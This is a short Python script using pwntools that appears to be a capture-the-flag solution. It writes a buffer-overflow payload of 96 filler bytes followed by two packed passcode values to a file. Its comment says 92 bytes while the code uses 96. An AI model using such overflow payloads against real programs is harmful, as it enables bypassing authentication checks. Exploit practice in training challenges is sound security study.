from pwn import *

first = 338150
second = 13371337

#packing the data

#92 A's cause for some reason I can't understand the check of the passcodes is from the last 8 bytes.
payload = 96* 'A'.encode() +  p32(second) +  p32(first)

with open('payload', 'wb') as payload_file:
    payload_file.write(payload)
